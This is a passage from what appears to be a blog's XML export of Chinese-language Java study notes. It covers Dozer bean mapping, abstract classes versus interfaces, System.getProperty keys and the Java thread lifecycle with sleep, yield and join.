<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">beans</span> <span class="token name">PUBLIC</span> <span class="token string">"-//SPRING//DTD BEAN//EN"</span> <span class="token string">"http://www.springframework.org/dtd/spring-beans.dtd"</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>baseMapper<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.dozer.spring.DozerBeanMapperFactoryBean<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mappingFiles<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>classpath:mapping/dozer-mapping.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用baseMapper进行Bean的转换</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span> 
<span class="token keyword">private</span> <span class="token class-name">Mapper</span> baseMapper<span class="token punctuation">;</span> 
<span class="token keyword">private</span> <span class="token class-name">UserVO</span> <span class="token function">doToVo</span><span class="token punctuation">(</span><span class="token class-name">UserDO</span> userDO<span class="token punctuation">)</span><span class="token punctuation">{</span>     
  <span class="token keyword">if</span><span class="token punctuation">(</span>userDO <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>     
  <span class="token class-name">UserVO</span> vo <span class="token operator">=</span> baseMapper<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>userDO<span class="token punctuation">,</span> <span class="token class-name">UserVO</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     
  <span class="token keyword">if</span><span class="token punctuation">(</span>userDO<span class="token punctuation">.</span>getCompanyId <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token function">getCompany</span><span class="token punctuation">(</span>vo<span class="token punctuation">)</span><span class="token punctuation">;</span>     
  <span class="token keyword">return</span> vo<span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过以上的代码加配置，我们就实现了从DO转换到VO的部分操作，之所以说是部分操作，是因为我们在dozer-mapping.xml并没有做多余的配置，只是使用dozer将DO中和VO中共有的属性转换了过来。对于其他的类型不同或者名称不同等的转换可以参考官网例子通过设置dozer-mapping.xml文件来实现。</p>
<p>上面还有一个getCompany()没有实现。这个方法其实就是通过companyId查询出company实体，然后在赋值给UserVO中的company属性。</p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>abstract class和interface的区别</title>
    <url>/20221027/f7c553a3.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th></th>
<th>Abstract class</th>
<th>Interface</th>
</tr>
</thead>
<tbody>
<tr>
<td>实例化</td>
<td>不能</td>
<td>不能</td>
</tr>
<tr>
<td>类</td>
<td>一种继承关系，一个类只能使用一次继承关系。<br>可以通过继承多个接口实现多重继承</td>
<td>一个类可以实现多个interface</td>
</tr>
<tr>
<td>数据成员</td>
<td>可有自己的</td>
<td>静态的不能被修改即必须是static final，一般不在此定义</td>
</tr>
<tr>
<td>方法</td>
<td>可以私有的，非abstract方法，必须实现</td>
<td>不可有私有的，默认是public abstract 类型</td>
</tr>
<tr>
<td>变量</td>
<td>可有私有的，默认是friendly 型，其值可以在子类中重新定义，也可以重新赋值</td>
<td>不可有私有的，默认是public static final 型，且必须给其初值，实现类中不能重新定义，不能改变其值。</td>
</tr>
<tr>
<td>设计理念</td>
<td>表示的是“is-a”关系</td>
<td>表示的是“like-a”关系</td>
</tr>
<tr>
<td>实现</td>
<td>需要继承，要用 extends</td>
<td>要用 implements</td>
</tr>
</tbody>
</table>
<p>​		<code>abstract class </code>和 <code>interface</code>在Java语言中都是用来进行抽象类（本文中的抽象类并非从abstract class翻译而来，它表示的是一个抽象体，而abstract class为Java语言中用于定义抽象类的一种方法）定义的</p>
<h1>定义</h1>
<ul>
<li>定义：abstract class</li>
</ul>
<p>​		声明方法的存在而不去实现它的类被叫做抽象类（abstract class），它用于要创建一个体现某些基本行为的类，并为该类声明方法，但不能在该类中实现该类的情况。不能创建abstract 类的实例。然而可以创建一个变量，其类型是一个抽象类，并让它指向具体子类的一个实例。不能有抽象构造函数或抽象静态方法。</p>
<p>​		abstract 类的子类为它们父类中的所有抽象方法提供实现，否则它们也是抽象类。取而代之，在子类中实现该方法。知道其行为的其它类可以在类中实现这些方法。</p>
<ul>
<li>定义：interface</li>
</ul>
<p>​		接口（interface）是抽象类的变体。在接口中，所有方法都是抽象的。多继承性可通过实现 这样的接口而获得。接口中的所有方法都是抽象的，没有一个有程序体。</p>
<p>​		接口只可以定义<code>static final</code>成员变量。接口的实现与子类相似，除了该实现类不能从接口定义中继承行为。当类实现特殊接口时，它定义（即将程序体给予）所有这种接口的方法。 然后，它可以在实现了该接口的类的任何对象上调用接口的方法。由于有抽象类，它允许使用接口名作为引用变量的类型。通常的动态联编将生效。引用可以转换到 接口类型或从接口类型转换，<code>instanceof </code>运算符可以用来决定某对象的类是否实现了接口。</p>
<blockquote>
<p>接口可以继承接口。抽象类可以实现(implements)接口，抽象类是可以继承实体类，但前提是实体类必须有明确的构造函数。</p>
<p>接口更关注“能实现什么功能”，而不管“怎么实现的”。</p>
</blockquote>
<h1>相同点</h1>
<p>A. 两者都是抽象类，都不能实例化。</p>
<p>B. interface实现类及abstrct class的子类都必须要实现已经声明的抽象方法。</p>
<h1>不同点</h1>
<ul>
<li>
<p><code>interface</code>需要实现，要用<code>implements</code>，而<code>abstract class</code>需要继承，要用<code>extends</code>。</p>
</li>
<li>
<p>一个类可以实现多个<code>interfac</code>e，但一个类只能继承一个<code>abstract class</code>。</p>
</li>
<li>
<p><code>interface</code>强调特定功能的实现，而<code>abstract class</code>强调所属关系</p>
</li>
<li>
<p>尽管interface实现类及<code>abstrct class</code>的子类都必须要实现相应的抽象方法，但实现的形式不同。</p>
<p><code>interface</code>中的每一个方法都是抽象方法，都只是声明的 (declaration, 没有方法体)，实现类必须要实现。</p>
<p><code>abstract class</code>的子类可以有选择地实现。 这个选择有两点含义：</p>
<ol>
<li><code>abastract class</code>中并非所有的方法都是抽象的。<strong>只有那些冠有<code>abstract</code>的方法才是抽象的，子类必须实现</strong>。那些没有<code>abstract</code>的方法，在<code>abstrct class</code>中必须定义方法体。</li>
<li><code>abstract class</code>的子类在继承它时，对非抽象方法既可以直接继承，也可以覆盖；而对抽象方法，可以选择实现，也可以通过再次声明其方法为抽象的方式，无需实现，留给其子类来实现，但此类必须也声明为抽象类。既是抽象类，当然也不能实例化。</li>
</ol>
</li>
<li>
<p><code>abstract class</code>是<code>interface</code>与<code>class</code>中介</p>
<p>​		<code>interface</code>是完全抽象的，只能声明方法，而且只能声明pulic的方法，不能声明<code>private</code>及<code>protected</code>的方法，不能定义方法体，也不能声明实例变量。然而，<code>interface</code>却可以声明常量变量，并且在JDK中不难找出这种例子。但将常量变量放在<code>interface</code>中违背了其作为接 口的作用而存在的宗旨，也混淆了<code>interface</code>与类的不同价值。如果的确需要，可以将其放在相应的<code>abstract class</code>或<code>class</code>中。<br>
​		<code>abstract class</code>在<code>interface</code>及<code>class</code>中起到了承上启下的作用。一方面，<code>abstract class</code>是抽象的，可以声明抽象方法，以规范子类必须实现的功能；另一方面，它又可以定义缺省的方法体，供子类直接使用或覆盖。另外，它还可以定义自己 的实例变量，以供子类通过继承来使用。</p>
</li>
</ul>
<h1>应用场合</h1>
<ul>
<li>
<p><code>interface</code></p>
<ol>
<li>类与类之前需要特定的接口进行协调，而不在乎其如何实现。</li>
<li>作为能够实现特定功能的标识存在，也可以是什么接口方法都没有的纯粹标识。</li>
<li>需要将一组类视为单一的类，而调用者只通过接口来与这组类发生联系。</li>
<li>需要实现特定的多项功能，而这些功能之间可能完全没有任何联系。</li>
</ol>
</li>
<li>
<p><code>abstract class</code><br>
==在既需要统一的接口，又需要实例变量或缺省的方法的情况下，就可以使用它==</p>
<p>最常见的有：</p>
<ol>
<li>定义了一组接口，但又不想强迫每个实现类都必须实现所有的接口。可以用<code>abstract class</code>定义一组方法体，甚至可以是空方法体，然后由子类选择自己所感兴趣的方法来覆盖。</li>
<li>某些场合下，只靠纯粹的接口不能满足类与类之间的协调，还必需类中表示状态的变量来区别不同的关系。<code>abstract</code>的中介作用可以很好地满足这一点。</li>
<li>规范了一组相互协调的方法，其中一些方法是共同的，与状态无关的，可以共享的，无需子类分别实现；而另一些方法却需要各个子类根据自己特定的状态来实现特定的功能。</li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>系统方法：System.getProperty</title>
    <url>/20221027/80d3479f.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>code</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>java.versionJava</td>
<td>运行时环境版本</td>
</tr>
<tr>
<td>java.vendorJava</td>
<td>运行时环境供应商</td>
</tr>
<tr>
<td>java.vendor.urlJava</td>
<td>供应商的URL</td>
</tr>
<tr>
<td>java.homeJava</td>
<td>安装目录</td>
</tr>
<tr>
<td>java.vm.specification.versionJava</td>
<td>虚拟机规范版本</td>
</tr>
<tr>
<td>java.vm.specification.vendorJava</td>
<td>虚拟机规范供应商</td>
</tr>
<tr>
<td>java.vm.specification.nameJava</td>
<td>虚拟机规范名称</td>
</tr>
<tr>
<td>java.vm.versionJava</td>
<td>虚拟机实现版本</td>
</tr>
<tr>
<td>java.vm.vendorJava</td>
<td>虚拟机实现供应商</td>
</tr>
<tr>
<td>java.vm.nameJava</td>
<td>虚拟机实现名称</td>
</tr>
<tr>
<td>java.specification.versionJava</td>
<td>运行时环境规范版本</td>
</tr>
<tr>
<td>java.specification.vendorJava</td>
<td>运行时环境规范供应商</td>
</tr>
<tr>
<td>java.specification.nameJava</td>
<td>运行时环境规范名称</td>
</tr>
<tr>
<td>java.class.versionJava</td>
<td>类格式版本号</td>
</tr>
<tr>
<td>java.class.pathJava</td>
<td>类路径</td>
</tr>
<tr>
<td>java.library.path</td>
<td>加载库时搜索的路径列表</td>
</tr>
<tr>
<td>java.io.tmpdir</td>
<td>默认的临时文件路径</td>
</tr>
<tr>
<td>java.compiler</td>
<td>要使用的JIT编译器的名称</td>
</tr>
<tr>
<td>java.ext.dirs</td>
<td>一个或多个扩展目录的路径</td>
</tr>
<tr>
<td><a href="http://os.name">os.name</a></td>
<td>操作系统的名称</td>
</tr>
<tr>
<td>os.arch</td>
<td>操作系统的架构</td>
</tr>
<tr>
<td>os.version</td>
<td>操作系统的版本</td>
</tr>
<tr>
<td>file.separator</td>
<td>文件分隔符（在UNIX系统中是“/”）</td>
</tr>
<tr>
<td>path.separator</td>
<td>路径分隔符（在UNIX系统中是“:”）</td>
</tr>
<tr>
<td>line.separator</td>
<td>行分隔符（在UNIX系统中是“/n”）</td>
</tr>
<tr>
<td><a href="http://user.name">user.name</a></td>
<td>用户的账户名称</td>
</tr>
<tr>
<td>user.home</td>
<td>用户的主目录</td>
</tr>
<tr>
<td>user.dir</td>
<td>用户的当前工作目录</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM基础回顾</title>
    <url>/20221027/6cd20d81.html</url>
    <content><![CDATA[<h2 id="线程生命周期">线程生命周期</h2>
<p>当线程被创建并启动以后，它既不是一启动就进入了执行状态，也不是一直处于执行状态。在线程的生命周期中，它要经过 <strong>新建（New）、就绪（Runnable）、运行（Running）、阻塞（Blocked）和死亡（Dead）5种状态</strong>。尤其是当线程启动以后，它不可能一直"霸占"着CPU独自运行，所以CPU需要在多条线程之间切换，于是 <strong>线程状态也会多次在运行、阻塞之间切换</strong>。</p>
<h3 id="0-生命周期图">0. 生命周期图</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/7126254-55d47d5ebef3b1e2-16380810237142.webp" alt="7126254-55d47d5ebef3b1e2"></p>
<h3 id="1-新建（New）状态">1. 新建（New）状态</h3>
<p>当程序使用new关键字创建了一个线程之后，该线程就处于 <strong>新建状态</strong>，此时的线程情况如下：</p>
<ul>
<li>此时JVM<strong>为其分配内存，并初始化其成员变量的值</strong>；</li>
<li>此时<strong>线程对象</strong>没有表现出任何线程的动态特征，程序也不会执行线程的线程执行体；</li>
</ul>
<h3 id="2-就绪（Runnable）状态">2. 就绪（Runnable）状态</h3>
<ul>
<li>此时JVM会为其<strong>创建方法调用栈和程序计数器</strong>；</li>
<li>该状态的线程一直处于<strong>线程就绪队列</strong>（尽管是采用队列形式，事实上，把它称为可运行池而不是可运行队列。因为CPU的调度不一定是按照先进先出的顺序来调度的），线程并没有开始运行；</li>
<li>此时线程<strong>等待系统为其分配CPU时间片</strong>，并不是说执行了start()方法就立即执行；</li>
</ul>
<h4 id="调用start-方法与run-方法对比">调用start()方法与run()方法对比</h4>
<ol>
<li>
<p><strong>调用start()方法来启动线程，系统会把该run()方法当成线程执行体来处理</strong>。</p>
</li>
<li>
<p>直接调用线程对象的run()方法，则run()方法立即就会被执行，而且在run()方法返回之前其他线程无法并发执行。也就是说，<strong>系统把线程对象当成一个普通对象，而run()方法也是一个普通方法，而不是线程执行体</strong>；</p>
</li>
<li>
<p>需要指出的是，调用了线程的run()方法之后，<strong>该线程已经不再处于新建状态</strong>，不要再次调用线程对象的start()方法。<strong>只能对处于新建状态的线程调用start()方法，否则将引发==IllegaIThreadStateExccption==异常</strong>；</p>
</li>
</ol>
<h4 id="如何让子线程调用start-方法之后立即执行而非-等待执行-：">如何让子线程调用start()方法之后立即执行而非"等待执行"：</h4>
<p>程序可以使用Thread.sleep(1) 来让当前运行的线程（主线程）睡眠1毫秒，1毫秒就够了，<strong>因为在这1毫秒内CPU不会空闲，它会去执行另一个处于就绪状态的线程，这样就可以让子线程立即开始执行</strong>；</p>
<h3 id="3-运行（Running）状态">3. 运行（Running）状态</h3>
<p>当CPU开始调度处于 <strong>就绪状态</strong> 的线程时，此时线程获得了CPU时间片才得以真正开始执行run()方法的线程执行体，则该线程处于 <strong>运行状态</strong>。</p>
<pre class="line-numbers language-none"><code class="language-none">如果计算机只有一个CPU，那么在任何时刻只有一个线程处于运行状态；
如果在一个多处理器的机器上，将会有多个线程并行执行，处于运行状态；
当线程数大于处理器数时，依然会存在多个线程在同一个CPU上轮换的现象；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>处于运行状态的线程最为复杂，它 <strong>不可能一直处于运行状态（除非它的线程执行体足够短，瞬间就执行结束了）</strong>，线程在运行过程中需要被中断，<strong>目的是使其他线程获得执行的机会，线程调度的细节取决于底层平台所采用的策略</strong>。线程状态可能会变为 <strong>阻塞状态、就绪状态和死亡状态</strong>。比如：</p>
<ol>
<li>
<p>对于采用 <strong>抢占式策略</strong> 的系统而言，系统会给每个可执行的线程分配一个时间片来处理任务；当该时间片用完后，系统就会剥夺该线程所占用的资源，让其他线程获得执行的机会。线程就会又 <strong>从运行状态变为就绪状态</strong>，重新等待系统分配资源；</p>
</li>
<li>
<p>对于采用 <strong>协作式策略</strong>的系统而言，只有当一个线程调用了它的yield()方法后才会放弃所占用的资源—<strong>也就是必须由该线程主动放弃所占用的资源</strong>，线程就会又 <strong>从运行状态变为就绪状态</strong>。</p>
</li>
</ol>
<h3 id="4-阻塞（Blocked）状态">4. 阻塞（Blocked）状态</h3>
<p>处于运行状态的线程在某些情况下，让出CPU并暂时停止自己的运行，进入 <strong>阻塞状态</strong>。</p>
<h4 id="线程将会进入阻塞状态可能原因">线程将会进入阻塞状态可能原因</h4>
<ol>
<li>
<p><strong>线程调用sleep()方法</strong>，主动放弃所占用的处理器资源，暂时进入中断状态（<strong>不会释放持有的对象锁</strong>），时间到后等待系统分配CPU继续执行；</p>
</li>
<li>
<p><strong>线程调用一个阻塞式IO方法</strong>，在该方法返回之前，该线程被阻塞；</p>
</li>
<li>
<p><strong>线程试图获得一个同步监视器</strong>，但该同步监视器正被其他线程所持有;</p>
</li>
<li>
<p><strong>程序调用了线程的suspend方法将线程挂起</strong>；</p>
</li>
<li>
<p><strong>线程调用wait</strong>，等待notify/notifyAll唤醒时(会释放持有的对象锁)；</p>
</li>
</ol>
<h4 id="阻塞状态分类">阻塞状态分类</h4>
<ol>
<li>
<p><strong>等待阻塞</strong>：运行状态中的 <strong>线程执行wait()方法</strong>，使本线程进入到等待阻塞状态；</p>
</li>
<li>
<p><strong>同步阻塞</strong>：线程在 <strong>获取synchronized同步锁失败</strong>（因为锁被其它线程占用），它会进入到同步阻塞状态；</p>
</li>
<li>
<p><strong>其他阻塞</strong>：通过调用线程的 <strong>sleep()或join()或发出I/O请求</strong> 时，线程会进入到阻塞状态。当 <strong>sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕</strong> 时，线程重新转入就绪状态；</p>
</li>
</ol>
<p><strong>在阻塞状态的线程只能进入就绪状态，无法直接进入运行状态</strong>。而就绪和运行状态之间的转换通常不受程序控制，<strong>而是由系统线程调度所决定</strong>。当处于就绪状态的线程获得处理器资源时，该线程进入运行状态；<strong>当处于运行状态的线程失去处理器资源时，该线程进入就绪状态</strong>。</p>
<p>但有一个方法例外，<strong>调用yield()方法可以让运行状态的线程转入就绪状态</strong>。</p>
<h3 id="4-1-无限等待（WAITING）状态">4.1 无限等待（WAITING）状态</h3>
<p>线程处于 <strong>无限制等待状态</strong>，等待一个特殊的事件来重新唤醒，如：</p>
<blockquote>
<ol>
<li>通过wait()方法进行等待的线程等待一个notify()或者notifyAll()方法；</li>
<li>通过join()方法进行等待的线程等待目标线程运行结束而唤醒；</li>
</ol>
</blockquote>
<p>以上两种一旦通过相关事件唤醒线程，线程就进入了 <strong>就绪（RUNNABLE）状态</strong> 继续运行。</p>
<h4 id="4-2-时限等待（TIMED-WAITING）状态">4.2 时限等待（TIMED_WAITING）状态</h4>
<p>线程进入了一个 <strong>时限等待状态</strong>，如：<strong>sleep(3000)</strong>，等待3秒后线程重新进行 <strong>就绪（RUNNABLE）状态</strong> 继续运行。</p>
<h3 id="5-死亡（Dead）状态">5. 死亡（Dead）状态</h3>
<p>线程会以如下3种方式结束，结束后就处于 <strong>死亡状态</strong>：</p>
<ol>
<li>
<p><strong>run()或call()方法执行完成</strong>，线程正常结束（<strong>TERMINATED状态</strong>）</p>
</li>
<li>
<p><strong>线程抛出一个未捕获的Exception或Error</strong>；</p>
</li>
<li>
<p><strong>直接调用该线程stop()方法来结束该线程</strong>（该方法容易导致死锁，通常不推荐使用）</p>
</li>
</ol>
<p><strong>处于死亡状态的线程对象也许是活的，但是，它已经不是一个单独执行的线程</strong>。线程一旦死亡，就不能复生。 <strong>如果在一个死去的线程上调用start()方法，会抛出java.lang.IllegalThreadStateException异常</strong>。所以，需要注意的是：<strong>一旦线程通过start()方法启动后就再也不能回到新建（NEW）状态，线程终止后也不能再回到就绪（RUNNABLE）状态</strong>。</p>
<h4 id="5-1-终止（TERMINATED）状态">5.1 终止（TERMINATED）状态</h4>
<p>线程执行完毕后，进入终止（TERMINATED）状态。</p>
<h3 id="6-线程相关方法">6. 线程相关方法</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Thread</span><span class="token punctuation">{</span>
    <span class="token comment">// 线程的启动</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 线程体</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 已废弃</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 已废弃</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 已废弃</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">suspend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 在指定的毫秒数内让当前正在执行的线程休眠</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">long</span> millis<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 同上，增加了纳秒参数</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">long</span> millis<span class="token punctuation">,</span> <span class="token keyword">int</span> nanos<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 测试线程是否处于活动状态</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 中断线程</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 测试线程是否已经中断</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 测试当前线程是否已经中断</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">interrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment">// 等待该线程终止</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">;</span> 
    <span class="token comment">// 等待该线程终止的时间最长为 millis 毫秒</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token keyword">long</span> millis<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">;</span> 
    <span class="token comment">// 等待该线程终止的时间最长为 millis 毫秒 + nanos 纳秒</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token keyword">long</span> millis<span class="token punctuation">,</span> <span class="token keyword">int</span> nanos<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="6-1-线程就绪、运行和死亡状态转换">6.1 线程就绪、运行和死亡状态转换</h4>
<ol>
<li><strong>就绪状态转换为运行状态</strong>：此线程得到CPU资源；</li>
<li><strong>运行状态转换为就绪状态</strong>：此线程主动调用yield()方法或在运行过程中失去CPU资源。</li>
<li><strong>运行状态转换为死亡状态</strong>：此线程执行执行完毕或者发生了异常；</li>
</ol>
<p>注意：</p>
<p>当调用线程中的yield()方法时，线程从运行状态转换为就绪状态，<strong>但接下来CPU调度就绪状态中的那个线程具有一定的随机性</strong>，因此，可能会出现A线程调用了yield()方法后，接下来CPU仍然调度了A线程的情况。</p>
<h4 id="6-2-run-start">6.2 run &amp; start</h4>
<p>通过调用start启动线程，线程执行时会执行run方法中的代码。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：线程的启动；
<span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：线程的执行体；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="6-3-sleep-yield">6.3 sleep &amp; yield</h4>
<h5 id="sleep">sleep()</h5>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">通过<span class="token function">sleep</span><span class="token punctuation">(</span>millis<span class="token punctuation">)</span>使线程进入休眠一段时间，该方法在指定的时间内无法被唤醒，同时也不会释放对象锁。

sleep是静态方法，最好不要用<span class="token class-name">Thread</span>的实例对象调用它，因为它睡眠的始终是当前正在运行的线程，而不是调用它的线程对象，它只对正在运行状态的线程对象有效

<span class="token class-name">Java</span>线程调度是<span class="token class-name">Java</span>多线程的核心，只有良好的调度，才能充分发挥系统的性能，提高程序的执行效率。但是不管程序员怎么编写调度，只能最大限度的影响线程执行的次序，而不能做到精准控制。因为使用sleep方法之后，线程是进入阻塞状态的，只有当睡眠的时间结束，才会重新进入到就绪状态，而就绪状态进入到运行状态，是由系统控制的，我们不可能精准的去干涉它，所以如果调用<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>使得线程睡眠<span class="token number">1</span>秒，可能结果会大于<span class="token number">1</span>秒。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="yield">yield()</h5>
<pre class="line-numbers language-none"><code class="language-none">与sleep类似，也是Thread类提供的一个静态的方法，它也可以让当前正在执行的线程暂停，让出CPU资源给其他的线程。但是和sleep()方法不同的是，它不会进入到阻塞状态，而是进入到就绪状态。

yield()方法只是让当前线程暂停一下，重新进入就绪线程池中，让系统的线程调度器重新调度器重新调度一次，完全可能出现这样的情况：当某个线程调用yield()方法之后，线程调度器又将其调度出来重新进入到运行状态执行。

实际上，当某个线程调用了yield()方法暂停之后，优先级与当前线程相同，或者优先级比当前线程更高的就绪状态的线程更有可能获得执行的机会，当然，只是有可能，因为我们不可能精确的干涉cpu调度线程。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>关于sleep()方法和yield()方的区别如下</strong></p>
<pre class="line-numbers language-none"><code class="language-none">sleep方法暂停当前线程后，会进入阻塞状态，只有当睡眠时间到了，才会转入就绪状态。而yield方法调用后 ，是直接进入就绪状态，所以有可能刚进入就绪状态，又被调度到运行状态；

sleep方法声明抛出了InterruptedException，所以调用sleep方法的时候要捕获该异常，或者显示声明抛出该异常。而yield方法则没有声明抛出任务异常；

sleep方法比yield方法有更好的可移植性，通常不要依靠yield方法来控制并发线程的执行；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="6-4-join">6.4 join</h4>
<p>线程的合并的含义就是 <strong>将几个并行线程的线程合并为一个单线程执行</strong>，应用场景是 <strong>当一个线程必须等待另一个线程执行完毕才能执行时</strong>，Thread类提供了join方法来完成这个功能，<strong>注意，它不是静态方法</strong>。</p>
<p>join有3个重载的方法：</p>
<pre class="line-numbers language-none"><code class="language-none">void join()    
    当前线程等该加入该线程后面，等待该线程终止。    
void join(long millis)    
    当前线程等待该线程终止的时间最长为 millis 毫秒。 如果在millis时间内，该线程没有执行完，那么当前线程进入就绪状态，重新等待cpu调度   
void join(long millis,int nanos)    
    等待该线程终止的时间最长为 millis 毫秒 + nanos 纳秒。如果在millis时间内，该线程没有执行完，那么当前线程进入就绪状态，重新等待cpu调度
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>举例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
